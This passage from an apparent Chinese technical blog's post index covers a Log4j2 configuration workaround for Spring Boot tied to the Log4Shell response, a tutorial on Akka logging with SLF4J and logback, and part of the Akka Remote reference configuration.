123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475public class Log4j2SystemExt extends Log4J2LoggingSystem &#123; public static final Map&lt;String, String&gt; SYSTEMS; static &#123; Map&lt;String, String&gt; systems = new LinkedHashMap&lt;String, String&gt;(); systems.put(&quot;ch.qos.logback.core.Appender&quot;, &quot;org.springframework.boot.logging.logback.LogbackLoggingSystem&quot;); systems.put(&quot;org.apache.logging.log4j.core.impl.Log4jContextFactory&quot;, &quot;org.letter.spring.simple.Log4j2SystemExt&quot;); systems.put(&quot;java.util.logging.LogManager&quot;, &quot;org.springframework.boot.logging.java.JavaLoggingSystem&quot;); SYSTEMS = Collections.unmodifiableMap(systems); &#125; private static final String FILE_PROTOCOL = &quot;file&quot;; public Log4j2SystemExt(ClassLoader classLoader) &#123; super(classLoader); &#125; public static void setExtLoggerSystem() &#123; try &#123; Class&lt;?&gt; clz = Class.forName(&quot;org.springframework.boot.logging.LoggingSystem&quot;); Field field = clz.getDeclaredField(&quot;SYSTEMS&quot;); field.setAccessible(true); Field modifiers = Field.class.getDeclaredField(&quot;modifiers&quot;); modifiers.setAccessible(true); modifiers.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL); System.out.println(&quot;before setExtLoggerSystem: &quot; + field.get(null)); field.set(null, Log4j2SystemExt.SYSTEMS); System.out.println(&quot;after setExtLoggerSystem: &quot; + field.get(null)); modifiers.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL); &#125; catch (Exception e) &#123; System.out.println(&quot;setExtLoggerSystem:&quot; + e.getMessage()); e.printStackTrace(); &#125; &#125; @Override protected void loadConfiguration(String location, LogFile logFile) &#123; Assert.notNull(location, &quot;Location must not be null&quot;); try &#123; LoggerContext ctx = (LoggerContext) LogManager.getContext(false); InputStream is = new ByteArrayInputStream(Log4jXmlConfig.log4jXml.getBytes(StandardCharsets.UTF_8)); ConfigurationSource source = new ConfigurationSource(is); ctx.start(ConfigurationFactory.getInstance().getConfiguration(ctx, source)); &#125; catch (Exception ex) &#123; throw new IllegalStateException( &quot;Could not initialize Log4J2 logging from &quot; + location, ex); &#125; &#125;// 原有// @Override// protected void loadConfiguration(String location, LogFile logFile) &#123;// Assert.notNull(location, &quot;Location must not be null&quot;);// try &#123;// LoggerContext ctx = (LoggerContext) LogManager.getContext(false);// URL url = ResourceUtils.getURL(location);// InputStream stream = url.openStream();// ConfigurationSource configurationSource = null;// if (FILE_PROTOCOL.equals(url.getProtocol())) &#123;// configurationSource = new ConfigurationSource(stream, ResourceUtils.getFile(url));// &#125; else &#123;// configurationSource = new ConfigurationSource(stream, url);// &#125;// ctx.start(ConfigurationFactory.getInstance().getConfiguration(ctx, configurationSource));// &#125;// catch (Exception ex) &#123;// throw new IllegalStateException(// &quot;Could not initialize Log4J2 logging from &quot; + location, ex);// &#125;// &#125;&#125; 配置 12345678910111213141516171819202122232425262728293031323334353637Log4j2SystemExt.setExtLoggerSystem();public class Log4jXmlConfig &#123; public static String log4jXml = &quot;&lt;?xml version=\\&quot;1.0\\&quot; encoding=\\&quot;UTF-8\\&quot;?&gt;\\n&quot; + &quot;&lt;Configuration status=\\&quot;WARN\\&quot;&gt;\\n&quot; + &quot;\\t&lt;Properties&gt;\\n&quot; + &quot;\\t\\t&lt;Property name=\\&quot;PID\\&quot;&gt;????&lt;/Property&gt;\\n&quot; + &quot;\\t\\t&lt;Property name=\\&quot;LOG_EXCEPTION_CONVERSION_WORD\\&quot;&gt;%xwEx&lt;/Property&gt;\\n&quot; + &quot;\\t\\t&lt;Property name=\\&quot;LOG_LEVEL_PATTERN\\&quot;&gt;%5p&lt;/Property&gt;\\n&quot; + &quot;\\t\\t&lt;Property name=\\&quot;LOG_PATTERN\\&quot;&gt;%clr&#123;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125;&#125;&#123;faint&#125; %clr&#123;$&#123;LOG_LEVEL_PATTERN&#125;&#125; %clr&#123;$&#123;sys:PID&#125;&#125;&#123;magenta&#125; %clr&#123;---&#125;&#123;faint&#125; %clr&#123;[%15.15t]&#125;&#123;faint&#125; %clr&#123;%-40.40c&#123;1.&#125;&#125;&#123;cyan&#125; %clr&#123;:&#125;&#123;faint&#125; %m%n$&#123;sys:LOG_EXCEPTION_CONVERSION_WORD&#125;&lt;/Property&gt;\\n&quot; + &quot;\\t&lt;/Properties&gt;\\n&quot; + &quot;\\t&lt;Appenders&gt;\\n&quot; + &quot;\\t\\t&lt;Console name=\\&quot;Console\\&quot; target=\\&quot;SYSTEM_OUT\\&quot; follow=\\&quot;true\\&quot;&gt;\\n&quot; + &quot;\\t\\t\\t&lt;PatternLayout pattern=\\&quot;$&#123;LOG_PATTERN&#125;\\&quot; /&gt;\\n&quot; + &quot;\\t\\t&lt;/Console&gt;\\n&quot; + &quot;\\t&lt;/Appenders&gt;\\n&quot; + &quot;\\t&lt;Loggers&gt;\\n&quot; + &quot;\\t\\t&lt;Logger name=\\&quot;org.apache.catalina.startup.DigesterFactory\\&quot; level=\\&quot;error\\&quot; /&gt;\\n&quot; + &quot;\\t\\t&lt;Logger name=\\&quot;org.apache.catalina.util.LifecycleBase\\&quot; level=\\&quot;error\\&quot; /&gt;\\n&quot; + &quot;\\t\\t&lt;Logger name=\\&quot;org.apache.coyote.http11.Http11NioProtocol\\&quot; level=\\&quot;warn\\&quot; /&gt;\\n&quot; + &quot;\\t\\t&lt;logger name=\\&quot;org.apache.sshd.common.util.SecurityUtils\\&quot; level=\\&quot;warn\\&quot;/&gt;\\n&quot; + &quot;\\t\\t&lt;Logger name=\\&quot;org.apache.tomcat.util.net.NioSelectorPool\\&quot; level=\\&quot;warn\\&quot; /&gt;\\n&quot; + &quot;\\t\\t&lt;Logger name=\\&quot;org.crsh.plugin\\&quot; level=\\&quot;warn\\&quot; /&gt;\\n&quot; + &quot;\\t\\t&lt;logger name=\\&quot;org.crsh.ssh\\&quot; level=\\&quot;warn\\&quot;/&gt;\\n&quot; + &quot;\\t\\t&lt;Logger name=\\&quot;org.eclipse.jetty.util.component.AbstractLifeCycle\\&quot; level=\\&quot;error\\&quot; /&gt;\\n&quot; + &quot;\\t\\t&lt;Logger name=\\&quot;org.hibernate.validator.internal.util.Version\\&quot; level=\\&quot;warn\\&quot; /&gt;\\n&quot; + &quot;\\t\\t&lt;logger name=\\&quot;org.springframework.boot.actuate.autoconfigure.CrshAutoConfiguration\\&quot; level=\\&quot;warn\\&quot;/&gt;\\n&quot; + &quot;\\t\\t&lt;logger name=\\&quot;org.springframework.boot.actuate.endpoint.jmx\\&quot; level=\\&quot;warn\\&quot;/&gt;\\n&quot; + &quot;\\t\\t&lt;logger name=\\&quot;org.thymeleaf\\&quot; level=\\&quot;warn\\&quot;/&gt;\\n&quot; + &quot;\\t\\t&lt;Root level=\\&quot;info\\&quot;&gt;\\n&quot; + &quot;\\t\\t\\t&lt;AppenderRef ref=\\&quot;Console\\&quot; /&gt;\\n&quot; + &quot;\\t\\t&lt;/Root&gt;\\n&quot; + &quot;\\t&lt;/Loggers&gt;\\n&quot; + &quot;&lt;/Configuration&gt;&quot;;&#125; 7.参考https://www.oschina.net/news/174145/all-response-to-log4shell","categories":[{"name":"java","slug":"java","permalink":"https://wuhaocn.github.io/categories/java/"}],"tags":[{"name":"log4j","slug":"log4j","permalink":"https://wuhaocn.github.io/tags/log4j/"}]},{"title":"Akka-SLF4J打印日志","slug":"network/akka/Akka-SLF4J打印日志","date":"2021-12-03T09:08:28.304Z","updated":"2021-12-03T09:09:32.964Z","comments":true,"path":"2021/12/03/network/akka/Akka-SLF4J打印日志/","link":"","permalink":"https://wuhaocn.github.io/2021/12/03/network/akka/Akka-SLF4J%E6%89%93%E5%8D%B0%E6%97%A5%E5%BF%97/","excerpt":"","text":"1. 用SLF4J 打印Akka日志你可能注意到，我们直接将quoteResponse 打印到标准的输出是一个很不好的想法，让我们通过启用SLF4J Facade打印日志来修改这个。 1.1 通过日志来修复Actor类Akka提供了一个非常小的trait 来打印日志，称为 ActorLogging。让我们来修改一下代码： 123456789101112131415161718192021222324classTeacherLogActor extendsActor withActorLogging &#123; valquotes =List( &quot;Moderation is for cowards&quot;, &quot;Anything worth doing is worth overdoing&quot;, &quot;The trouble is you think you have time&quot;, &quot;You never gonna know if you never even try&quot;) defreceive =&#123; caseQuoteRequest =&gt; &#123; importutil.Random //get a random element (for now) valquoteResponse=QuoteResponse(quotes(Random.nextInt(quotes.size))) log.info(quoteResponse.toString()) &#125; &#125; //We&#x27;ll cover the purpose of this method in the Testing section defquoteList=quotes &#125; 这里有点绕道。实际上，当我们以日志记下来一个message，ActorLogging 中的logging 方法已经将该消息publishes到了EventStream。那什么是EventStream？​ 1.2 EventStream and Logging EventStream的行为其实有点像消息中介，我们可以通过它发布和接收消息。和一般的MOM的微秒区别就是，EventStream的订阅者（subscribers）只能是Actor。在logging消息的场景，所有的log message都会发布到EventStream中。默认情况下，订阅这些消息的Actor是DefaultLogger ，它只是简单的将消息打印到标准输出。代码片段如下： 123456classDefaultLogger extendsActor withStdOutLogger &#123; overridedefreceive:Receive =&#123; ... caseevent:LogEvent ⇒ print(event) &#125;&#125; 这就是为什么当我面再次启动StudentSimulatorApp程序的时候，我们看到日志消息被打印到终端。 也就是说，EventStream不仅仅适合打日志。它是Actor世界中常用的public-subscribe机制。让我们再回到SLF4J 1.3 配置Akka来启用SLF4J代码片段如下： 12345akka&#123; loggers =[&quot;akka.event.slf4j.Slf4jLogger&quot;] loglevel =&quot;DEBUG&quot; logging-filter =&quot;akka.event.slf4j.Slf4jLoggingFilter&quot;&#125; 我们将这些配置信息存储在名为application.conf文件中，这个文件需要配置在你的classpath里面。在我们的工程目录下，可以放在main/resources目录下面。从这个配置中，我们可以1、loggers属性表明，Actor将消息订阅到log Event中。 Slf4jLogger所做的仅仅是消费 log messages并将它放到SLF4J Logger facade里。2、loglevel 属性表明，日志的输出级别。3、logging-filter和loglevel 结合，传入日志消息的输出级别并将符合的消息publishing到EventStream中。你可能会说，在之前的例子里怎么就没有application.conf文件呢？那是因为Akka提供了一些默认的配置属性。 1.4 THROW IN A logback.xml我们将通过logback.xml文件来配置SLF4J logger backed，如下： 123456789101112131415161718192021&lt;?xmlversion=&quot;1.0&quot;encoding=&quot;UTF-8&quot;?&gt; &lt;configuration&gt; &lt;appendername=&quot;FILE&quot; class=&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&gt; &lt;encoder&gt; &lt;pattern&gt;%d&#123;HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n&lt;/pattern&gt; &lt;/encoder&gt; &lt;rollingPolicyclass=&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;&gt; &lt;fileNamePattern&gt;logs\\akka.%d&#123;yyyy-MM-dd&#125;.%i.log&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class=&quot;ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP&quot;&gt; &lt;maxFileSize&gt;50MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;/rollingPolicy&gt; &lt;/appender&gt; &lt;rootlevel=&quot;DEBUG&quot;&gt; &lt;appender-refref=&quot;FILE&quot;/&gt; &lt;/root&gt;&lt;/configuration&gt; 同样将它放到 main/resources目录下面，你得确保 main/resources目录在你的eclipse或者其他IDE的 Classpath里面。同时，你得将logback 和slf4j-api加入到你的pom文件中或者build.sbt中，如下： 12345678910111213141516171819202122232425name :=&quot;AkkaNotes_Messaging&quot; version :=&quot;1.0&quot; organization :=&quot;com.arunma&quot; scalaVersion :=&quot;2.11.2&quot; resolvers ++= Seq(&quot;repo&quot;at &quot;http://repo.typesafe.com/typesafe/releases/&quot;) libraryDependencies ++=&#123; valakkaVersion =&quot;2.3.4&quot; valsprayVersion =&quot;1.3.1&quot; Seq( &quot;com.typesafe.akka&quot;%%&quot;akka-actor&quot;%akkaVersion, &quot;io.spray&quot;%%&quot;spray-can&quot;%sprayVersion, &quot;io.spray&quot;%%&quot;spray-routing&quot;%sprayVersion, &quot;io.spray&quot;%%&quot;spray-json&quot;%&quot;1.2.6&quot;, &quot;com.typesafe.akka&quot;%%&quot;akka-slf4j&quot;%akkaVersion, &quot;ch.qos.logback&quot;%&quot;logback-classic&quot;%&quot;1.1.2&quot;, &quot;com.typesafe.akka&quot;%%&quot;akka-testkit&quot;%akkaVersion, &quot;org.scalatest&quot;%%&quot;scalatest&quot;%&quot;2.2.0&quot; )&#125; 当我们再次启动StudentSimulatorApp的时候，并且发送消息到新的TeacherLogActor中，将会生成一个名为akkaxxxxx.log的文件，内容大概如下：如果想及时了解Spark、Hadoop或者Hbase相关的文章，欢迎关注微信公共帐号：iteblog_hadoop","categories":[{"name":"network","slug":"network","permalink":"https://wuhaocn.github.io/categories/network/"}],"tags":[{"name":"akka","slug":"akka","permalink":"https://wuhaocn.github.io/tags/akka/"}]},{"title":"Akka-Remote-配置","slug":"network/akka/Akka-Remote-配置","date":"2021-12-03T08:24:00.895Z","updated":"2021-12-03T08:42:23.494Z","comments":true,"path":"2021/12/03/network/akka/Akka-Remote-配置/","link":"","permalink":"https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Remote-%E9%85%8D%E7%BD%AE/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000100110021003100410051006100710081009101010111012101310141015101610171018101910201021102210231024102510261027102810291030103110321033103410351036103710381039104010411042104310441045104610471048104910501051105210531054105510561057105810591060106110621063106410651066106710681069107010711072107310741075107610771078107910801081108210831084108510861087108810891090109110921093109410951096109710981099110011011102110311041105110611071108110911101111111211131114111511161117111811191120112111221123112411251126112711281129113011311132113311341135113611371138113911401141#//#shared###################################### Akka Remote Reference Config File ####################################### This is the reference config file that contains all the default settings.# Make your edits/overrides in your application.conf.# comments about akka.actor settings left out where they are already in akka-# actor.jar, because otherwise they would be repeated in config rendering.## For the configuration of the new remoting implementation (Artery) please look# at the bottom section of this file as it is listed separately.akka &#123; actor &#123; serializers &#123; akka-containers = &quot;akka.remote.serialization.MessageContainerSerializer&quot; akka-misc = &quot;akka.remote.serialization.MiscMessageSerializer&quot; artery = &quot;akka.remote.serialization.ArteryMessageSerializer&quot; proto = &quot;akka.remote.serialization.ProtobufSerializer&quot; daemon-create = &quot;akka.remote.serialization.DaemonMsgCreateSerializer&quot; primitive-long = &quot;akka.remote.serialization.LongSerializer&quot; primitive-int = &quot;akka.remote.serialization.IntSerializer&quot; primitive-string = &quot;akka.remote.serialization.StringSerializer&quot; primitive-bytestring = &quot;akka.remote.serialization.ByteStringSerializer&quot; akka-system-msg = &quot;akka.remote.serialization.SystemMessageSerializer&quot; &#125; serialization-bindings &#123; &quot;akka.actor.ActorSelectionMessage&quot; = akka-containers &quot;akka.remote.DaemonMsgCreate&quot; = daemon-create &quot;akka.remote.artery.ArteryMessage&quot; = artery # 因为akka.protobuf.Message没有扩展Serializable但 # GeneratedMessage做，需要使用更具体的在这里的顺序 # 避免歧义。 # Since akka.protobuf.Message does not extend Serializable but # GeneratedMessage does, need to use the more specific one here in order # to avoid ambiguity. &quot;akka.protobuf.GeneratedMessage&quot; = proto #自从com.google.protobuf.Message没有扩展Serializable但是 # GeneratedMessage做，需要使用更具体的在这里的顺序 # 避免歧义。 # This com.google.protobuf serialization binding is only used if the class can be loaded， # 即com.google.protobuf依赖已经添加到应用程序项目中。 # Since com.google.protobuf.Message does not extend Serializable but # GeneratedMessage does, need to use the more specific one here in order # to avoid ambiguity. # This com.google.protobuf serialization binding is only used if the class can be loaded, # i.e. com.google.protobuf dependency has been added in the application project. &quot;com.google.protobuf.GeneratedMessage&quot; = proto &quot;java.util.Optional&quot; = akka-misc &#125; # 了保持协议的向后兼容性，这些绑定没有 # 认包含。可以使用enable-additional-serialization-bindings=on来启用它们。 # 果akka.remote.artery是默认启用的。如果启用了= # akka.actor.allow-java-serialization =。 # For the purpose of preserving protocol backward compatibility these bindings are not # included by default. They can be enabled with enable-additional-serialization-bindings=on. # They are enabled by default if akka.remote.artery.enabled=on or if # akka.actor.allow-java-serialization=off. additional-serialization-bindings &#123; &quot;akka.actor.Identify&quot; = akka-misc &quot;akka.actor.ActorIdentity&quot; = akka-misc &quot;scala.Some&quot; = akka-misc &quot;scala.None$&quot; = akka-misc &quot;akka.actor.Status$Success&quot; = akka-misc &quot;akka.actor.Status$Failure&quot; = akka-misc &quot;akka.actor.ActorRef&quot; = akka-misc &quot;akka.actor.PoisonPill$&quot; = akka-misc &quot;akka.actor.Kill$&quot; = akka-misc &quot;akka.remote.RemoteWatcher$Heartbeat$&quot; = akka-misc &quot;akka.remote.RemoteWatcher$HeartbeatRsp&quot; = akka-misc &quot;akka.actor.ActorInitializationException&quot; = akka-misc &quot;akka.dispatch.sysmsg.SystemMessage&quot; = akka-system-msg &quot;java.lang.String&quot; = primitive-string &quot;akka.util.ByteString$ByteString1C&quot; = primitive-bytestring &quot;akka.util.ByteString$ByteString1&quot; = primitive-bytestring &quot;akka.util.ByteString$ByteStrings&quot; = primitive-bytestring &quot;java.lang.Long&quot; = primitive-long &quot;scala.Long&quot; = primitive-long &quot;java.lang.Integer&quot; = primitive-int &quot;scala.Int&quot; = primitive-int # Java Serializer默认用于异常。 # 建议自定义序列化器 # 远程tor.Status.Failure中请求回复。您可以添加 # 绑定到akka-misc (MiscMessageSerializerSpec)的异常 # 一个构造函数的单个message String或构造函数的message String为 # 为第一个参数，cause Throwable作为第二个参数。请注意，事实并非如此 # 一般异常，如IllegalArgumentException，添加此绑定是安全的 # 因为它可能有一个没有必需构造函数的子类。 # Java Serializer is by default used for exceptions. # It&#x27;s recommended that you implement custom serializer for exceptions that are # sent remotely, e.g. in akka.actor.Status.Failure for ask replies. You can add # binding to akka-misc (MiscMessageSerializerSpec) for the exceptions that have # a constructor with single message String or constructor with message String as # first parameter and cause Throwable as second parameter. Note that it&#x27;s not # safe to add this binding for general exceptions such as IllegalArgumentException # because it may have a subclass without required constructor. &quot;java.lang.Throwable&quot; = java &quot;akka.actor.IllegalActorStateException&quot; = akka-misc &quot;akka.actor.ActorKilledException&quot; = akka-misc &quot;akka.actor.InvalidActorNameException&quot; = akka-misc &quot;akka.actor.InvalidMessageException&quot; = akka-misc &#125; serialization-identifiers &#123; &quot;akka.remote.serialization.ProtobufSerializer&quot; = 2 &quot;akka.remote.serialization.DaemonMsgCreateSerializer&quot; = 3 &quot;akka.remote.serialization.MessageContainerSerializer&quot; = 6 &quot;akka.remote.serialization.MiscMessageSerializer&quot; = 16 &quot;akka.remote.serialization.ArteryMessageSerializer&quot; = 17 &quot;akka.remote.serialization.LongSerializer&quot; = 18 &quot;akka.remote.serialization.IntSerializer&quot; = 19 &quot;akka.remote.serialization.StringSerializer&quot; = 20 &quot;akka.remote.serialization.ByteStringSerializer&quot; = 21 &quot;akka.remote.serialization.SystemMessageSerializer&quot; = 22 &#125; deployment &#123; default &#123; # if this is set to a valid remote address, the named actor will be # deployed at that node e.g. &quot;akka.tcp://sys@host:port&quot; remote = &quot;&quot; target &#123; # A list of hostnames and ports for instantiating the children of a # router # The format should be on &quot;akka.tcp://sys@host:port&quot;, where: # - sys is the remote actor system name # - hostname can be either hostname or IP address the remote actor # should connect to # - port should be the port for the remote server on the other node # The number of actor instances to be spawned is still taken from the # nr-of-instances setting as for local routers; the instances will be # distributed round-robin among the given nodes. nodes = [] &#125; &#125; &#125; &#125; remote &#123; ### Settings shared by classic remoting and Artery (the new implementation of remoting) # If set to a nonempty string remoting will use the given dispatcher for # its internal actors otherwise the default dispatcher is used. Please note # that since remoting can load arbitrary 3rd party drivers (see # &quot;enabled-transport&quot; and &quot;adapters&quot; entries) it is not guaranteed that # every module will respect this setting. use-dispatcher = &quot;akka.remote.default-remote-dispatcher&quot; # 设置失败检测器监视连接。 # 对于TCP来说，快速的故障检测并不重要，因为 # 大多数连接失败是由TCP本身捕获的。 # 默认的DeadlineFailureDetector将触发，如果没有心跳 # 持续时间心跳间隔+可接受的心跳暂停，即124秒 # 使用默认设置。 # Settings for the failure detector to monitor connections. # For TCP it is not important to have fast failure detection, since # most connection failures are captured by TCP itself. # The default DeadlineFailureDetector will trigger if there are no heartbeats within # the duration heartbeat-interval + acceptable-heartbeat-pause, i.e. 124 seconds # with the default settings. transport-failure-detector &#123; # 故障检测器实现的FQCN。 # 它必须实现akka.remote.FailureDetector # 使用com.typesafe.config.Config和 # akka.actor.EventStream参数。 # FQCN of the failure detector implementation. # It must implement akka.remote.FailureDetector and have # a public constructor with a com.typesafe.config.Config and # akka.actor.EventStream parameter. implementation-class = &quot;akka.remote.DeadlineFailureDetector&quot; # 向每个连接发送keep-alive心跳消息的频率。 # How often keep-alive heartbeat messages should be sent to each connection. heartbeat-interval = 4 s # 在认为是异常之前，可能丢失/延迟的心跳数将被接受。 # “心跳间隔”的范围对于能够在心跳到达时的突然、偶尔的停顿(例如垃圾收集或网络掉落)中生存很重要。 # Number of potentially lost/delayed heartbeats that will be # accepted before considering it to be an anomaly. # A margin to the `heartbeat-interval` is important to be able to survive sudden, # occasional, pauses in heartbeat arrivals, due to for example garbage collect or # network drop. acceptable-heartbeat-pause = 120 s &#125; # Phi累积故障检测器的设置(http://www.jaist.ac.jp/~defago/files/pdf/IS_RR_2004_010.pdf # [Hayashibara等人])用于远程死亡监视。 # 如果没有心跳，默认的PhiAccrualFailureDetector将触发 # duration heartbeat-interval + acceptable-heartbeat-pause + threshold_adjustment， # 即默认设置大约12.5秒。 # Settings for the Phi accrual failure detector (http://www.jaist.ac.jp/~defago/files/pdf/IS_RR_2004_010.pdf # [Hayashibara et al]) used for remote death watch. # The default PhiAccrualFailureDetector will trigger if there are no heartbeats within # the duration heartbeat-interval + acceptable-heartbeat-pause + threshold_adjustment, # i.e. around 12.5 seconds with default settings. watch-failure-detector &#123; # 故障检测器实现的FQCN。 # 它必须实现akka.remote.FailureDetector # 使用com.typesafe.config.Config和 # akka.actor.EventStream参数。 # FQCN of the failure detector implementation. # It must implement akka.remote.FailureDetector and have # a public constructor with a com.typesafe.config.Config and # akka.actor.EventStream parameter. implementation-class = &quot;akka.remote.PhiAccrualFailureDetector&quot; # 向每个连接发送keep-alive心跳消息的频率。 # How often keep-alive heartbeat messages should be sent to each connection. heartbeat-interval = 1 s # 定义故障检测器阈值。 # 低门槛容易产生许多错误的怀疑，但可以确保 # 在真正崩溃的情况下快速检测。相反,高 # threshold产生的错误更少，但需要更多的时间来检测 # 真正的崩溃。 # Defines the failure detector threshold. # A low threshold is prone to generate many wrong suspicions but ensures # a quick detection in the event of a real crash. Conversely, a high # threshold generates fewer mistakes but needs more time to detect # actual crashes. threshold = 10.0 # 心跳间到达时间的样本数量 # 计算连接的失败超时时间。 # Number of the samples of inter-heartbeat arrival times to adaptively # calculate the failure timeout for connections. max-sample-size = 200 # 用于正态分布的最小标准偏差 # AccrualFailureDetector。标准偏差过低可能导致 # 对突然但正常的心跳偏差过于敏感 # 到达时间。 # Minimum standard deviation to use for the normal distribution in # AccrualFailureDetector. Too low standard deviation might result in # too much sensitivity for sudden, but normal, deviations in heartbeat # inter arrival times. min-std-deviation = 100 ms # 可能丢失/延迟的心跳数 # 在认为它是异常之前接受。 # 这一界限很重要，因为它能让你在突然的、偶然的、 # 心跳到达时暂停，例如由于垃圾收集或 # 网络下降。 # Number of potentially lost/delayed heartbeats that will be # accepted before considering it to be an anomaly. # This margin is important to be able to survive sudden, occasional, # pauses in heartbeat arrivals, due to for example garbage collect or # network drop. acceptable-heartbeat-pause = 10 s # 检查失败检测器标记为不可达的节点的频率 # How often to check for nodes marked as unreachable by the failure # detector unreachable-nodes-reaper-interval = 1s # 发送心跳请求后，第一次检测失败 # 将在这段时间后开始，即使没有心跳消息 # 收到。 # After the heartbeat request has been sent the first failure detection # will start after this period, even though no heartbeat mesage has # been received. expected-response-after = 1 s &#125; # remote deployment configuration section deployment &#123; # If true, will only allow specific classes to be instanciated on this system via remote deployment enable-whitelist = off whitelist = [] &#125;#//#shared &#125;&#125;akka &#123; remote &#123;#//#classic ### Configuration for classic remoting # 超时，在此之后，远程子系统的启动被认为是失败的。 # 如果您的传输驱动程序(请参阅enabled-transports一节)需要更长的加载时间，则增加此值。 # Timeout after which the startup of the remoting subsystem is considered # to be failed. Increase this value if your transport drivers (see the # enabled-transports section) need longer time to be loaded. startup-timeout = 10 s # 超时，在此之后远程子系统将优雅地关闭 # 被认为失败了。超时后，远程连接系统 # 强制关机。如果您的运输司机增加这个值 # (参见enabled-transports一节)需要更长的时间才能正常停止。 # Timout after which the graceful shutdown of the remoting subsystem is # considered to be failed. After the timeout the remoting system is # forcefully shut down. Increase this value if your transport drivers # (see the enabled-transports section) need longer time to stop properly. shutdown-timeout = 10 s # 在关闭驱动程序之前，远程控制子系统尝试刷新 # 所有挂起的写。此设置控制远程处理的最大时间 # 愿意在关闭司机之前等待。 # Before shutting down the drivers, the remoting subsystem attempts to flush # all pending writes. This setting controls the maximum time the remoting is # willing to wait before moving on to shut down the drivers. flush-wait-on-shutdown = 2 s # 为出站消息重用入站连接 # Reuse inbound connections for outbound messages use-passive-connections = on # 控制被拒绝的写被重新尝试后的回退间隔。(如果传输程序的内部缓冲区已满，它们可能会拒绝写入) # Controls the backoff interval after a refused write is reattempted. # (Transports may refuse writes if their internal buffer is full) backoff-interval = 5 ms # 发送到传输堆栈的管理命令的确认超时。 # Acknowledgment timeout of management commands sent to the transport stack. command-ack-timeout = 30 s # 出站关联执行握手的超时时间。 # 如果传输是akka.remote.net .tcp或akka.remote.net .ssl # 将使用为传输配置的连接超时。 # The timeout for outbound associations to perform the handshake. # If the transport is akka.remote.netty.tcp or akka.remote.netty.ssl # the configured connection-timeout for the transport will be used instead. handshake-timeout = 15 s ### Security settings # 启用不受信任模式，以确保服务器托管参与者的完全安全，防止客户端发送系统消息，例如: # 比如“创建”、“暂停”、“恢复”、“终止”、“监督”、“链接”等。 # Enable untrusted mode for full security of server managed actors, prevents # system messages to be send by clients, e.g. messages like &#x27;Create&#x27;, # &#x27;Suspend&#x27;, &#x27;Resume&#x27;, &#x27;Terminate&#x27;, &#x27;Supervise&#x27;, &#x27;Link&#x27; etc. untrusted-mode = off # 当&#x27;untrusted-mode=on&#x27;入站参与者选择默认被丢弃。 # 具有此白名单中定义的路径的actor被授予接收actor选择消息的权限。 # 例如:trusted-selection-paths = [&quot;/user/接待员&quot;，&quot;/user/namingService&quot;] # When &#x27;untrusted-mode=on&#x27; inbound actor selections are by default discarded. # Actors with paths defined in this white list are granted permission to receive actor # selections messages. # E.g. trusted-selection-paths = [&quot;/user/receptionist&quot;, &quot;/user/namingService&quot;] trusted-selection-paths = [] # 如果远程服务器要求它的对等端共享相同的 # secure-cookie(在&#x27;remote&#x27;部分定义)?通过安全cookie # 在第一次握手时。如果初始连接被拒绝 # message包含一个不匹配的cookie或cookie丢失。 # Should the remote server require that its peers share the same # secure-cookie (defined in the &#x27;remote&#x27; section)? Secure cookies are passed # between during the initial handshake. Connections are refused if the initial # message contains a mismatching cookie or the cookie is missing. require-cookie = off # Deprecated since 2.4-M1 secure-cookie = &quot;&quot; ### Logging # 如果这是“on”，Akka将在DEBUG级别记录所有入站消息， # 如果关闭，则不记录 # If this is &quot;on&quot;, Akka will log all inbound messages at DEBUG level, # if off then they are not logged log-received-messages = off # 如果这是“on”，Akka将在DEBUG级别记录所有出站消息， # 如果关闭，则不记录 # If this is &quot;on&quot;, Akka will log all outbound messages at DEBUG level, # if off then they are not logged log-sent-messages = off # 连接状态生命周期 # Sets the log granularity level at which Akka logs remoting events. This setting # can take the values OFF, ERROR, WARNING, INFO, DEBUG, or ON. For compatibility # reasons the setting &quot;on&quot; will default to &quot;debug&quot; level. Please note that the effective # logging level is still determined by the global logging level of the actor system: # for example debug level remoting events will be only logged if the system # is running with debug level logging. # Failures to 